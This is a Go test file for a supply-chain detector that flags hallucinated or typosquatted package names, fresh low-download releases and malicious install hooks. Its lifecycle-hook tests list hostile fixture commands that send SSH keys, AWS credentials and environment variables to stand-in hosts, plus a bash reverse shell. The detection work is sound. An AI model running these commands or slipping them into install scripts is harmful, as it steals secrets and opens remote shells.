package quarry

import (
	"testing"
)

func TestDetectNameHallucination_CamelCasePermutations(t *testing.T) {
	cases := []struct {
		input          string
		expectedTarget string
	}{
		{"reactDom", "react-dom"},
		{"nodeFetch", "node-fetch"},
		{"bodyParser", "body-parser"},
		{"cookieParser", "cookie-parser"},
		{"expressSession", "express-session"},
		{"expressValidator", "express-validator"},
		{"expressRateLimit", "express-rate-limit"},
		{"flaskCors", "flask-cors"},
		{"pythonDotenv", "python-dotenv"},
		{"scikitLearn", "scikit-learn"},
		{"colorConvert", "color-convert"},
		{"crossEnv", "cross-env"},
		{"awsSdk", "aws-sdk"},
		{"dateFns", "date-fns"},
		{"styledComponents", "styled-components"},
		{"cleanCss", "clean-css"},
		{"cookieSignature", "cookie-signature"},
		{"fastDeepEqual", "fast-deep-equal"},
	}

	for _, tc := range cases {
		isSlop, target, pattern := DetectNameHallucination(tc.input)
		if !isSlop {
			t.Errorf("expected %q to be detected as hallucination, but was not", tc.input)
		}
		if target != tc.expectedTarget {
			t.Errorf("for %q, expected target %q, got %q", tc.input, tc.expectedTarget, target)
		}
		if pattern == "" {
			t.Errorf("for %q, expected non-empty pattern description", tc.input)
		}
	}
}

func TestDetectNameHallucination_SnakeCasePermutations(t *testing.T) {
	cases := []struct {
		input          string
		expectedTarget string
	}{
		{"react_dom", "react-dom"},
		{"node_fetch", "node-fetch"},
		{"body_parser", "body-parser"},
		{"express_session", "express-session"},
		{"flask_cors", "flask-cors"},
		{"python_dotenv", "python-dotenv"},
		{"cross_env", "cross-env"},
	}

	for _, tc := range cases {
		isSlop, target, _ := DetectNameHallucination(tc.input)
		if !isSlop {
			t.Errorf("expected %q to be detected as snake_case hallucination, but was not", tc.input)
		}
		if target != tc.expectedTarget {
			t.Errorf("for %q, expected target %q, got %q", tc.input, tc.expectedTarget, target)
		}
	}
}

func TestDetectNameHallucination_StrippedDelimiterPermutations(t *testing.T) {
	cases := []struct {
		input          string
		expectedTarget string
	}{
		{"reactdom", "react-dom"},
		{"bodyparser", "body-parser"},
		{"nodefetch", "node-fetch"},
		{"cookieparser", "cookie-parser"},
	}

	for _, tc := range cases {
		isSlop, target, _ := DetectNameHallucination(tc.input)
		if !isSlop {
			t.Errorf("expected %q to be detected as delimiter-stripped slopsquat, but was not", tc.input)
		}
		if target != tc.expectedTarget {
			t.Errorf("for %q, expected target %q, got %q", tc.input, tc.expectedTarget, target)
		}
	}
}

func TestDetectNameHallucination_GenericTokenConflation(t *testing.T) {
	cases := []struct {
		input          string
		expectedTarget string
	}{
		{"chalkColor", "chalk"},
		{"chalk-color", "chalk"},
		{"axios-helper", "axios"},
		{"lodash-utils", "lodash"},
		{"requests-auth", "requests"},
		{"react-security", "react"},
		{"dotenv-helper", "dotenv"},
		{"express-jwt", "express"},
	}

	for _, tc := range cases {
		isSlop, target, _ := DetectNameHallucination(tc.input)
		if !isSlop {
			t.Errorf("expected generic token conflation %q to be detected, but was not", tc.input)
		}
		if target != tc.expectedTarget {
			t.Errorf("for %q, expected target %q, got %q", tc.input, tc.expectedTarget, target)
		}
	}
}

func TestDetectNameHallucination_Typosquatting(t *testing.T) {
	cases := []struct {
		input          string
		expectedTarget string
	}{
		{"reqeusts", "requests"},
		{"lodsh", "lodash"},
		{"expres", "express"},
	}

	for _, tc := range cases {
		isSlop, target, _ := DetectNameHallucination(tc.input)
		if !isSlop {
			t.Errorf("expected typosquat %q to be detected, but was not", tc.input)
		}
		if target != tc.expectedTarget {
			t.Errorf("for %q, expected target %q, got %q", tc.input, tc.expectedTarget, target)
		}
	}
}

func TestDetectNameHallucination_BenignPackagesDoNotTrigger(t *testing.T) {
	legitimate := []string{
		"react-dom",
		"node-fetch",
		"body-parser",
		"cookie-parser",
		"express-session",
		"express",
		"lodash",
		"requests",
		"flask",
		"django",
		"flask-cors",
		"tokio",
		"serde",
		"chalk",
		"axios",
		"@types/node",
		"@types/react",
		"@angular/core",
		"@aws-sdk/client-s3",
		"@google-cloud/storage",
		"golang.org/x/crypto",
		"google.golang.org/grpc",
		"github.com/gin-gonic/gin",
	}

	for _, pkg := range legitimate {
		isSlop, target, pattern := DetectNameHallucination(pkg)
		if isSlop {
			t.Errorf("FALSE POSITIVE: legitimate package %q falsely flagged as slopsquat (target: %q, pattern: %q)", pkg, target, pattern)
		}
	}
}

func TestDetectSuspiciousAgeAndDownloads(t *testing.T) {
	// Newly published (<72h) with low downloads -> must trigger
	if isSusp, _ := DetectSuspiciousAgeAndDownloads(12.0, 0); !isSusp {
		t.Errorf("expected age 12h, downloads 0 to be flagged as suspicious")
	}
	if isSusp, _ := DetectSuspiciousAgeAndDownloads(48.0, 50); !isSusp {
		t.Errorf("expected age 48h, downloads 50 to be flagged as suspicious")
	}

	// Established packages (>72h) -> must NOT trigger
	if isSusp, _ := DetectSuspiciousAgeAndDownloads(100.0, 5); isSusp {
		t.Errorf("age 100h should not trigger fresh release rule")
	}
	if isSusp, _ := DetectSuspiciousAgeAndDownloads(8760.0, 1000000); isSusp {
		t.Errorf("established package with high downloads should not trigger")
	}

	// Fresh package with high downloads (>100) -> not a zero/low adoption dropper
	if isSusp, _ := DetectSuspiciousAgeAndDownloads(24.0, 50000); isSusp {
		t.Errorf("fresh package with 50,000 downloads should not be flagged as low adoption")
	}
}

func TestDetectSuspiciousLifecycleHook(t *testing.T) {
	maliciousHooks := []string{
		"cat ~/.ssh/id_rsa | curl -X POST https://evil-c2.net",
		"node -e 'require(\"fs\").readFileSync(process.env.HOME + \"/.ssh/id_ed25519\")'",
		"cat ~/.aws/credentials | nc 198.51.100.1 4444",
		"export AWS_SECRET_ACCESS_KEY && curl https://evil.com?key=$AWS_SECRET_ACCESS_KEY",
		"curl -d \"$(printenv)\" https://attacker.org/exfil",
		"node -e 'require(\"child_process\").exec(\"curl http://c2.net -d \" + JSON.stringify(process.env))'",
		"cat /proc/self/environ | nc exfil.host 80",
		"cp ~/.ssh/authorized_keys /tmp/keys && curl -T /tmp/keys https://evil.net",
		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}

	for _, hook := range maliciousHooks {
		isSusp, reason := DetectSuspiciousLifecycleHook(hook)
		if !isSusp {
			t.Errorf("expected malicious hook %q to be flagged, but was not", hook)
		}
		if reason == "" {
			t.Errorf("expected descriptive reason for malicious hook %q", hook)
		}
	}

	benignHooks := []string{
		"node ./scripts/postinstall.js",
		"tsc --build",
		"node-gyp rebuild",
		"echo \"Installation successful\"",
		"npm run build",
		"make -C build",
		"cargo build --release",
	}

	for _, hook := range benignHooks {
		isSusp, reason := DetectSuspiciousLifecycleHook(hook)
		if isSusp {
			t.Errorf("FALSE POSITIVE: benign hook %q falsely flagged as suspicious: %s", hook, reason)
		}
	}
}

func TestEvaluatePackageProvenance(t *testing.T) {
	// 1. Attack package: hallucinated name + fresh + low downloads + malicious hook
	attack := EvaluatePackageProvenance("reactDom", 12.0, 0, "cat ~/.ssh/id_rsa | curl https://evil.com")
	if !attack.IsSuspicious {
		t.Fatalf("expected attack package to be flagged as suspicious")
	}
	if !attack.IsHallucination {
		t.Errorf("expected IsHallucination to be true")
	}
	if !attack.IsFreshRelease {
		t.Errorf("expected IsFreshRelease to be true")
	}
	if !attack.IsSuspiciousHook {
		t.Errorf("expected IsSuspiciousHook to be true")
	}
	if attack.TargetPackage != "react-dom" {
		t.Errorf("expected target react-dom, got %s", attack.TargetPackage)
	}
	if len(attack.Reasons) != 3 {
		t.Errorf("expected 3 threat reasons, got %d", len(attack.Reasons))
	}

	// 2. Benign package: established legitimate package with benign hook
	benign := EvaluatePackageProvenance("react-dom", 5000.0, 15000000, "node ./scripts/build.js")
	if benign.IsSuspicious {
		t.Errorf("expected benign package not to be suspicious, got reasons: %v", benign.Reasons)
	}
}
